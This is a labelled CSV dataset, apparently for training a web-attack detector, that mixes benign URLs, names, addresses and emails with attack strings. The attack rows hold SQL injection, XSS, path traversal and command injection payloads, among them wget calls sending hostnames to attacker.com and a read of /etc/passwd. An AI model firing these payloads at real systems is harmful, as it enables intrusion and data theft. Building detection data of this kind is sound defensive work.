payload,label
-1scriptdocument.cookie=true;/script,1
/login?redirect_url=/dashboard/user/99532,0
/product/detail?user=shoes470,0
"-3443"")) union all select 4043,4043,4043,4043,4043,4043,4043#",1
"-4091)) as lqqy where 3030=3030 union all select 3030,3030,3030#",1
"cubo de tierra del vino, el",0
/home?category=123795,0
"1"") union all select null,null,null--",1
eber,0
/login?redirect_url=/dashboard/user/340427,0
"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""sfbc""=""sfbc",1
deering@asociaciondearquitectoslatinoamericanos.sv,0
;ls|id,1
/team/verona/cqwVP6qv/statistics,0
037r20n0do,0
70892292j,0
/index.php?id=contact559,0
espa7t4ro,0
seblcor,0
/assets/style.css?page=contact179,0
gaviota 13,0
nona,0
/api/v1/auth?token=qyKriQgy,0
"1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
n2ga1,0
%26 whoami,1
cunillera penades,0
en8og1da,0
/product?id=881432&utm_source=facebook&campaign=sale,0
34259,0
"1"")) as nncz where 2331=2331;select case when 6420=7941 then 1 else null end--",1
"(select (case when (1938=1938) then dbms_pipe.receive_message(chr(118)||chr(118)||chr(112)||chr(76),5) else 1938 end) from dual)",1
/team/verona/7e7wXgk5/statistics,0
"1';select benchmark(5000000,md5(0x714e4153))#",1
leoncio,0
"c/ avi xaxu, 157,",0
21291,0
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1
caminero carreo,0
t45o0a35,0
/login?redirect_url=/dashboard/user/315749,0
/search?category=contact936,0
/product/detail?page=2026460,0
/team/verona/S5tkTUgP/statistics,0
/api/v1/users?token=2026283,0
/team/verona/Aev6nhOi/statistics,0
claudine,0
/search?id=kma114,0
11738063j,0
el-gueba,0
-3956') or (8459=8459)*4906 and ('rflo' like 'rflo,1
3182733189788703,0
giralda,0
/product/detail?category=123818,0
|ls|,1
1'+(select tart where 9861=9861;begin dbms_lock.sleep(5); end--,1
lamphier,0
59718568b,0
"-4764) where 8200=8200 union all select 8200,8200,8200,8200--",1
pbkim,0
/login.html?q=book669,0
zanquita,0
/api/v1/auth?token=VVYN3SUJ,0
/api/v1/auth?token=h0ho4C83,0
///////{file},1
"c/ fray diego de cadiz, 50",0
/api/v1/auth?token=sB7YcHpd,0
"|| perl -e 'system(""id"")'",1
"-8409%') or make_set(9354=9354,7185) and ('%'='",1
'-- -,1
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
/product?id=183472&utm_source=facebook&campaign=sale,0
1916362826143144,0
/assets/style.css?user=hải747,0
1%'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('%'=',1
"c/ mineria, 151 13?g",0
"1%"";select (case when (1776=7688) then 1776 else 1/(select 0) end)--",1
"1%""));begin dbms_lock.sleep(5); end--",1
casaubn de rosa,0
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('uzxr'='uzxr",1
"1"") and make_set(4553=8132,8132) and (""pfci"" like ""pfci",1
darns cabrianes,0
/team/verona/w4ysokoK/statistics,0
"1%') union all select null,null,null,null,null,null,null#",1
/api/v1/auth?token=y9HvX6ad,0
/assets/style.css?category=kma821,0
menju,0
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'xmnd'='xmnd",1
"1' where 3760=3760 union all select null,null,null,null,null,null,null,null#",1
hablistn,0
/product/detail?id=shoes500,0
m6tr0cu029o8,0
| %00cat /etc/passwd,1
ar52eti67,0
/team/verona/HKcb0PfM/statistics,0
nevel,0
31594,0
82311327p,0
/api/v1/users?category=kma892,0
latchfor,0
ribera vitols,0
"camino ermita de la torre, 129,",0
pavn taracena,0
29450,0
/assets/style.css?id=2026186,0
92,0
salva carol,0
hirotaka,0
/search?token=admin548,0
"ronda sant antoni maria claret 144,",0
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",1
/assets/style.css?category=contact105,0
putrefa8tiva,0
1)) and 4595=4595#,1
-4262%'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',1
/product?id=223654&utm_source=facebook&campaign=sale,0
"1"")));select count(*) from generate_series(1,5000000) and (((""wdbg"" like ""wdbg",1
/..................................................................................{file},1
mari cielo,0
|| reg query HKLM\Software\Microsoft\Windows\CurrentVersion,1
"calle alfred nobel, 42 7-g",0
"<a href=""javascript&colon;alert&lpar;document&period;domain&rpar;"">Click Here</a>",1
du-tuan,0
pridiliano,0
/search?q=book500,0
' AND 1=1--,1
"c/ san salvador, 34, 10?f",0
10294,0
49159005r,0
"-1<DIV STYLE=""width: expression(document.cookie=true);"">",1
particular basterra 108,0
/product?id=350152&utm_source=facebook&campaign=sale,0
mayworth@sms24h.tr,0
/index.php?token=shoes233,0
adamson,0
kava_ivic@comercioenlacalle.info,0
torrent refojo,0
yasmmane,0
t20s3da436,0
5032561795933103,0
/api/v1/auth?token=yYTyZRtf,0
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",1
/home?page=123882,0
"-1526"") where 4870=4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",1
/api/v1/auth?token=CTYRW7ds,0
"1"") union all select null,null,null,null,null,null,null--",1
14860,0
usufrut*uar,0
/index.php?user=contact11,0
aghi,0
/index.php?category=profile341,0
orquestra,0
"-2319 union all select 5068,5068,5068#",1
/team/verona/9BHTPzzg/statistics,0
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('qfwc'='qfwc",1
/api/v1/auth?token=QOPEn39a,0
1646326838248937,0
"masia ca l'angel 39,",0
"coslada 83, 4g",0
8320919959502275,0
bisbe gonyalons 189 12?f,0
"1%'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1%"";select pg_sleep(5)--",1
meara,0
/api/v1/auth?token=rJTjr8vs,0
/product/detail?page=shoes337,0
saluotto cunill,0
9116424268966228,0
keighley,0
piedra obrador,0
de1l2nda9ur4,0
naguib,0
rosalia,0
; wget http://attacker.com/$(hostname),1
357rte0o,0
/product?id=358925&utm_source=facebook&campaign=sale,0
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1
"<img low id=xss src=""javascript:alert('xss')"">",1
\n whoami,1
tromen,0
borrica,0
1'))) and sleep(5)#,1
alcoy/alcoi,0
califrnico,0
heintje0@alpesfranceses.com.ro,0
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- ztzu",1
33529,0
"1) as fhvr where 5544=5544;iif(5257=5257,1,1/0)",1
manchita,0
luena,0
/api/v1/auth?token=prv9bYoI,0
hormilla,0
desplans,0
3598,0
"1') as chla where 6098=6098;select benchmark(5000000,md5(0x4c4d6142))--",1
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)# jcdh",1
g89273t2,0
causa,0
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
/product?id=217346&utm_source=facebook&campaign=sale,0
sukarrieta,0
45314,0
1') waitfor delay '0:0:5',1
75716077p,0
/team/verona/gU0NWcCU/statistics,0
/api/v1/auth?token=HuyBVN46,0
1%';select (case when (2783=9216) then 1 else 2783*(select 2783 from master..sysdatabases) end)--,1
"<bgsound id=xss src=""javascript:alert('xss');"">",1
/api/v1/auth?token=Y6uZbwvg,0
6g369zar41,0
/product?id=522499&utm_source=facebook&campaign=sale,0
/login.html?category=hải289,0
blount,0
"c/ tamarindo, 109 9e",0
/product?id=407222&utm_source=facebook&campaign=sale,0
4698577318753037,0
archie,0
survey,0
couri-manahan@copiar.com.fm,0
murphy-ekstroem@altoguadiana.ao,0
76rmi69so,0
/search?q=kma557,0
/product/detail?token=shoes806,0
carew1@koinup.ni,0
/api/v1/auth?token=t6IBqOoE,0
elda,0
earvin,0
noelyn,0
6733674859620328,0
45373661c,0
9ar5i04o,0
/product?id=154841&utm_source=facebook&campaign=sale,0
/api/v1/auth?token=1Bvav95i,0
8671,0
"1'))) union all select null,null,null,null,null,null,null--",1
1) where 3381=3381 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1
/login?redirect_url=/dashboard/user/744137,0
forfoleda,0
"1"" union all select null,null,null#",1
//../../../../../..{file},1
1002172418275885,0
ambas,0
/assets/style.css?page=book94,0
/api/v1/auth?token=1Kzj814z,0
2252,0
"1""));if(7899=7899) select 7899 else drop function zbbp--",1
maribeth4,0
/................{file},1
patrica0,0
incisivo,0
/product/detail?user=admin943,0
&& schtasks /create /tn test /tr cmd.exe /sc once /st 00:00,1
malh5jo,0
-1<<script>document.cookie=true;</script>,1
/index.php?id=2026999,0
"-9487)) as rvck where 9404=9404 or make_set(8921=6045,6045)--",1
21410,0
-8143) union all select 3014--,1
/home?user=profile129,0
-5313'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('wkkp' like 'wkkp,1
"1"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
sinclair@campanasextractoras.lc,0
e_ncobador,0
/index.php?id=apple27,0
05684753g,0
20491,0
"-2207%')) union all select 3339,3339,3339,3339,3339,3339#",1
pea barnera,0
comprensin,0
/product?id=712999&utm_source=facebook&campaign=sale,0
norberto,0
flury,0
agero,0
993,0
"-4558"" or (3965=3933)*3933 and ""hmdb"" like ""hmdb",1
1%');select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
"calle hernan cortes, 58,",0
"1%"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
03759,0
1'))) and (8982=8027)*8027 and ((('qkrv'='qkrv,1
12772631h,0
genesis,0
/product?id=997366&utm_source=facebook&campaign=sale,0
1)));waitfor delay '0:0:5'--,1
1) where 5025=5025;begin user_lock.sleep(5); end--,1
"-7202%"")) union all select 2901#",1
/login.html?id=kma424,0
; wget http://attacker.com/$(whoami),1
sherm,0
"set system location ""><iframe src=a onload=alert(""VL"") <",1
gottschlich_candy@piaceredelivery.pk,0
"-9947""))) union all select 8765,8765,8765,8765,8765#",1
autonell,0
1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,1
"1%')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('%'='",1
/login?redirect_url=/dashboard/user/902464,0
salustio,0
/product?id=500126&utm_source=facebook&campaign=sale,0
/api/v1/auth?token=FYFg4lAE,0
"1') as eany where 3169=3169 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
/search?id=profile596,0
/product/detail?q=hải586,0
ozmond-woolgar@adscrito.tj,0
68203466w,0
/api/v1/users?token=profile725,0
"<img src=`javascript:alert(""rm'crosssitescripting'"")`>",1
-6586')) or 2021=2996,1
/index.php?token=profile205,0
colosse@velaconsultores.gob,0
ap-remiadora,0
alonso,0
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",1
"-1915%"")) union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",1
"1"") where 4182=4182 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
9834147083222005,0
/home?token=hải29,0
"1))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((3504=3504",1
bordagorry,0
"1) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (3039=3039",1
1%'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('%'=',1
"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",1
"1) where 9338=9338 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
/index.php?category=2026508,0
"calle bir ganduz, 90",0
"1) as idvt where 3490=3490 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1') or 8421=(select count(*) from generate_series(1,5000000)) and ('obmu'='obmu",1
berrigan.demme@soyriojano.kg,0
"-3769""))) union all select 8456#",1
"1%""));if(4907=9581) select 4907 else drop function apqw--",1
keaton3,0
%7c pwd,1
1%')));select sleep(5) and ((('%'=',1
/search?user=profile228,0
"1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
26580,0
burns-gerron@100mbps.ht,0
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",1
/home?token=admin412,0
tibor,0
/product?id=558652&utm_source=facebook&campaign=sale,0
/api/v1/auth?token=EkaraJrU,0
/api/v1/auth?token=AFOTJCod,0
/api/v1/auth?token=yfeiH2Bb,0
25684857k,0
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",1
/product?id=839905&utm_source=facebook&campaign=sale,0
"1"")) as bbkl where 5686=5686;select benchmark(5000000,md5(0x4c4d6142))--",1
20048048y,0
"-5934' union all select 6096,6096,6096,6096,6096#",1
"1))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((9401=9401",1
nicova8@necesitocurro.kg,0
zo,0
cartaa,0
knute,0
borobia,0
; ls%0b,1
/home?token=book985,0
petronil,0
1)) and sleep(5)#,1
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",1
schauer,0
oke,0
' OR 'a'='b,1
18243165w,0
"-2803"") union all select 5337,5337,5337,5337,5337,5337,5337#",1
04100,0
/team/verona/xMGZFybt/statistics,0
-4157') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('rdhm'='rdhm,1
1' rlike (select * from (select(sleep(5)))vwyq)#,1
youji,0
m*ule38,0
30573468m,0
/api/v1/users?token=apple362,0
culinario,0
bannerman@nevadahispanica.aq,0
/login.html?token=kma521,0
7032,0
/login.html?q=kma335,0
-3988')) union all select 1113#,1
/team/verona/S4Avf2hD/statistics,0
lemoine5@informatica2009.zr,0
chuvalo@ppmanzanares.nc,0
/login?redirect_url=/dashboard/user/589288,0
/login.html?token=kma803,0
"-3462)) as biyl where 5143=5143 union all select 5143,5143,5143--",1
/login.html?id=shoes351,0
/api/v1/users?q=shoes205,0
etienne-wray@juegois.je,0
"1"" where 8727=8727;waitfor delay '0:0:5'--",1
8225299412218383,0
/home?token=contact57,0
tubalcan,0
"1') as wpom where 2620=2620 and elt(3114=3114,sleep(5))#",1
/product?id=914597&utm_source=facebook&campaign=sale,0
4az,0
&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion,1
-2214') union all select 8228#,1
alegra-dulantzi,0
/team/verona/S9F2O5G2/statistics,0
5258739000426196,0
31049,0
/api/v1/users?q=2026438,0
valdelagua del cerro,0
di874i0,0
cog6aticio,0
0598963816827000,0
/team/verona/suDsVuMR/statistics,0
/search?user=admin42,0
"1""));select sleep(5) and ((""twed"" like ""twed",1
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('dkra' like 'dkra",1
despacha!do,0
galligan@bijoubijoudiferente.vg,0
murad@magadan.org.pe,0
/assets/style.css?page=shoes142,0
mitsuter,0
/product?id=346443&utm_source=facebook&campaign=sale,0
""" onmouseover=""prompt(0) x=""",1
generato,0
morgenstern9@laschinas.ba,0
"-9247'))) union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",1
376gstu90,0
/product/detail?user=2026578,0
/assets/style.css?id=admin786,0
|id$(echo),1
"1%""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""",1
75010741j,0
"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
pueblica de valverde,0
-4219' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),1
desabor$ida,0
"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#",1
"<BODY BACKGROUND=""javascript:document.cookie=true;"">",1
judas,0
/assets/style.css?page=apple259,0
r4a8e3a,0
/api/v1/users?q=hải952,0
cinthia,0
5636450120440789,0
"1%'))) and elt(7425=3843,3843) and ((('%'='",1
a;/usr/bin/id;,1
/product?id=743753&utm_source=facebook&campaign=sale,0
1 and (select * from (select(sleep(5)))fzno)-- ybmz,1
1525,0
46460133h,0
sant joan de vilatorrada,0
/index.php?category=123588,0
/api/v1/auth?token=r25Tq3e0,0
6503452667221524,0
/login?redirect_url=/dashboard/user/414939,0
"de las aguas, 196",0
fomes,0
alins,0
/product/detail?category=hải432,0
"1"") as rnjx where 2679=2679 and 2388=benchmark(5000000,md5(0x6d457153))#",1
"1%')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='",1
1646619450025550,0
/product/detail?page=profile887,0
in977ili903,0
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1
smithdea,0
/product/detail?category=2026518,0
calle vallseca 123,0
/api/v1/users?page=123387,0
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",1
/product/detail?page=apple744,0
/team/verona/ua5Fe2Yb/statistics,0
barnechea,0
1' where 2913=2913 and (select * from (select(sleep(5)))fzno)--,1
"c/ criado, 21,",0
pinatero,0
/.../.../.../.../{file},1
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
&#X3c;,1
senterada,0
"1' in boolean mode) and 2388=benchmark(5000000,md5(0x6d457153))#",1
grijota,0
kesling8,0
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
/product/detail?token=2026792,0
/product/detail?id=hải945,0
"1)));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((1105=1105",1
"<input type=""hidden"" name=""asdhakjshdkjashdkjashd"" value=""\"" onload=confirm(000) />"" />",1
1 where 6223=6223 rlike sleep(5)#,1
